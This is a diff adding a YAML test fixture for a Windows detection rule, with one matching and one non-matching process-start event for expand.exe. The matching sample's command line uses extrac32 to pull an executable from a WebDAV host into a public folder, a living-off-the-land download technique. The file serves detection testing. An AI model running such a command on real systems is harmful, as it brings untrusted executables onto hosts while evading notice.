@@ -1,0 +1,24 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: expand.exe
+      executable: 'C:\Windows\System32\expand.exe'
+      command_line: 'extrac32 /Y /C \\webdav.example.org@80\share\file.exe C:\Users\Public\file.exe'
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: expand.exe
+      executable: 'C:\Windows\System32\expand.exe'
+      command_line: 'expand.exe C:\Temp\setup.cab -F:* C:\Temp\out'
